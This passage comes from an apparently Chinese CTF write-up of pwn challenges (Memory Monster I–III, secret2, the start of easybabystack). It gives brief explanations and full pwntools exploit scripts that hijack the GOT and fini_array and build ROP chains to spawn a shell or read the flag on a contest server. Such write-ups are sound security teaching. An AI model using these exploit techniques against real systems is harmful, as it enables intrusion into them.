class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10002</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">orw = asm(shellcraft.open("/home/ctf/flag", 0))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.read(3, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.write(1, "rsp", 0x20))</span></span><br><span class="line"><span class="string">orw += asm(shellcraft.exit(0))</span></span><br><span class="line"><span class="string">print '\\x'+hex(ord(orw[0]))[2:]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">orw2=asm(</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c2c2c2c       </span></span><br><span class="line"><span class="string">        mov rbx,0x4b4d404a034a  </span></span><br><span class="line"><span class="string">        xor rax, rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax,0x2c2c2c35352c2c2c</span></span><br><span class="line"><span class="string">        mov rbx,0x584f035058434403    </span></span><br><span class="line"><span class="string">        xor rax,rbx</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        mov esi,0x0</span></span><br><span class="line"><span class="string">        mov eax,0x2</span></span><br><span class="line"><span class="string">        xor ecx,ecx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,rax</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        mov rdx,0x50</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi,0x1</span></span><br><span class="line"><span class="string">        mov rax,0x1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line"><span class="keyword">print</span> <span class="string">'\\x'</span>+hex(ord(orw2[<span class="number">0</span>]))[<span class="number">2</span>:]</span><br><span class="line">payload=<span class="string">'const char main='</span>+str(hex(ord(orw2[<span class="number">0</span>])))+<span class="string">','</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(orw2)):</span><br><span class="line">    <span class="keyword">if</span> i != len(orw2)<span class="number">-1</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">','</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=<span class="string">'w'</span>+str(i)+<span class="string">'='</span>+str(hex(ord(orw2[i])))+<span class="string">';'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode=asm(shellcraft.sh())</span></span><br><span class="line">pause()</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">p.recvuntil(<span class="string">"(end with '@')"</span>)</span><br><span class="line">p.sendline(payload+<span class="string">'@'</span>)</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">p.can_recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-I"><a href="#Memory-Monster-I" class="headerlink" title="Memory Monster I"></a>Memory Monster I</h2><p>任意地址写，故意栈溢出然后会调用<code>__stack_chk_fail</code>函数，修改<code>__stack_chk_fail</code>的got表为后门即可</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_I"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10081</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x4011EB)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x404028</span>)+<span class="string">"\x00"</span>*<span class="number">0xc0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40124A</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-II"><a href="#Memory-Monster-II" class="headerlink" title="Memory Monster II"></a>Memory Monster II</h2><p>静态编译了,fini_array劫持为onegadget即可，onegadget苦苦找寻了好久，找到了一个有效的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_II"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10102</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x46F37F)</span></span><br><span class="line">dbg(<span class="number">0x4B80B8</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x4B80B0</span>))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"data:"</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(<span class="number">0x46F37F</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>另一种做法参考<a href="https://fmyy.pro/2020/05/23/Competition/DASCTF-May/" target="_blank" rel="noopener">fmmy</a>师傅题解</p><p>fini_array劫持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fini_array[0]:__libc_csu_fini</span><br><span class="line">fini_array[1]:main函数地址</span><br></pre></td></tr></table></figure><p>之后则可以形成一个循环链,然后任意地址写,可以在fini_array[2]之后构建ROP链,最后再将fini_array[0]改成leave_ret,fini_array[1]改成ret执行后续ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">'./main'</span>)</span><br><span class="line">p = remote(<span class="string">'183.129.189.60'</span>,<span class="number">10100</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(<span class="number">0x402CB0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line">pop_rdx_rsi = <span class="number">0x44BAF9</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41B380</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x448415</span></span><br><span class="line">syscall = <span class="number">0x46F745</span></span><br><span class="line">binsh = <span class="number">0x492895</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span>,p64(pop_rdx_rsi) + p64(<span class="number">59</span>) + p64(<span class="number">0</span>))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(mov_rax_rdx) + p64(pop_rdi_ret) + p64(binsh))</span><br><span class="line">m(<span class="number">0x4B80B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall))</span><br><span class="line">m(<span class="number">0x4B80B0</span>,p64(leave_ret) + p64(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Memory-Monster-III"><a href="#Memory-Monster-III" class="headerlink" title="Memory Monster III"></a>Memory Monster III</h2><p>这道题当时没有做出来，赛后参考taqini师傅博客，有学到了新的姿势</p><p><a href="http://taqini.space/2020/02/14/play-ROP-with-fini-array/#0x0-背景" target="_blank" rel="noopener">通过利用fini_array部署并启动ROP攻击</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"Memory_Monster_III"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port=<span class="string">'183.129.189.60'</span>,<span class="number">10008</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">m</span><span class="params">(address,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'addr:'</span>,p64(address))</span><br><span class="line">p.sendafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(<span class="number">0x402CA0</span>) + p64(<span class="number">0x401C1D</span>))</span><br><span class="line"></span><br><span class="line">pop_rdx_rsi = <span class="number">0x44AB09</span></span><br><span class="line">mov_rax_rdx = <span class="number">0x41AE80</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401746</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x447635</span></span><br><span class="line">leave_ret = <span class="number">0x401CF3</span></span><br><span class="line">ret = <span class="number">0x401016</span></span><br><span class="line">mprotect = <span class="number">0x448420</span></span><br><span class="line">read = <span class="number">0x447620</span></span><br><span class="line"></span><br><span class="line">shell_a = <span class="number">0x4BC100</span></span><br><span class="line">shell = asm(shellcraft.sh())</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span>,p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span>,p64(<span class="number">0x200</span>) + p64(shell_a) + p64(read))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(pop_rdi_ret) + p64(shell_a <span class="number">-0x100</span>) + p64(pop_rdx_rsi))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(<span class="number">7</span>) + p64(<span class="number">0x1000</span>) + p64(mprotect))</span><br><span class="line">m(<span class="number">0x4B50B0</span> + <span class="number">0x10</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span> + <span class="number">0x18</span>,p64(shell_a))</span><br><span class="line">m(<span class="number">0x4B50B0</span>,p64(leave_ret) + p64(ret) + p64(pop_rdi_ret))</span><br><span class="line"></span><br><span class="line">p.sendline(shell)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><p>文件描述符最多有1024个，也就是说最多打开文件1024多次,就不能继续打开了,则随机值之后全是0,因此输入”\x00”字节就能通过memcmp检测，然后close(0)，memcpy栈溢出， 只能orw flag了，并且此题远程是2.30的。2.23本地调试的时候有点不同。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># --- auther nocbtm ---</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">pwn_name = <span class="string">"secret3"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'183.129.189.60'</span>,<span class="number">10056</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='i386')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'libc6_2.30-0ubuntu2_amd64.so'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cus_rop</span><span class="params">(gadget1,gadget2,func_got,rdi,rsi,rdx)</span>:</span></span><br><span class="line">    payload = p64(gadget1)</span><br><span class="line">    payload += p64(<span class="number">0</span>)         <span class="comment">#rbx=0</span></span><br><span class="line">    payload += p64(<span class="number">1</span>)         <span class="comment">#rbp=1</span></span><br><span class="line">    payload += p64(func_got)  <span class="comment">#r12  call</span></span><br><span class="line">    payload += p64(rdi)       <span class="comment">#r13  rdx read size</span></span><br><span class="line">    payload += p64(rsi)       <span class="comment">#r14  rsi</span></span><br><span class="line">    payload += p64(rdx)       <span class="comment">#r15  edi read canshu</span></span><br><span class="line">    payload += p64(gadget2)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">56</span>      <span class="comment">#tiao zheng zhan zhen</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#dbg(0x401433)</span></span><br><span class="line">rdi=<span class="number">0x40161b</span></span><br><span class="line">ret=<span class="number">0x401016</span></span><br><span class="line">rsi_r15=<span class="number">0x401619</span></span><br><span class="line">bss=elf.bss()+<span class="number">0x300</span></span><br><span class="line">p.recvuntil(<span class="string">"name? ________________ #"</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>+p64(<span class="number">0x4021df</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">0x4021df</span>)+p64(rsi_r15)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(elf.plt[<span class="string">"open"</span>])</span><br><span class="line">payload+=cus_rop(<span class="number">0x401612</span>,<span class="number">0x4015F8</span>,elf.got[<span class="string">'read'</span>],<span class="number">0</span>,bss,<span class="number">64</span>)</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">1</span>)+p64(elf.plt[<span class="string">"write"</span>])</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1255</span>):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    payload=<span class="string">"\x00"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Secret: _____            #"</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">1254</span>:</span><br><span class="line">        sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">        libc.address=leak-0x7fcb248f9690+0x7fcb2488a000</span></span><br><span class="line"><span class="string">        info("leak",leak)</span></span><br><span class="line"><span class="string">        info("libc",libc.address)</span></span><br><span class="line"><span class="string">        sleep(1)</span></span><br><span class="line"><span class="string">        p.recv()</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easybabystack"><a href="#easybabystack" class="headerlink" title="easybabystack"></a>easybabystack</h2><p>这题比赛的时候也没做出来，参考fmyy师傅的题解</p><p> 格式化字符串中 *$连用表示取对应偏移位置的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 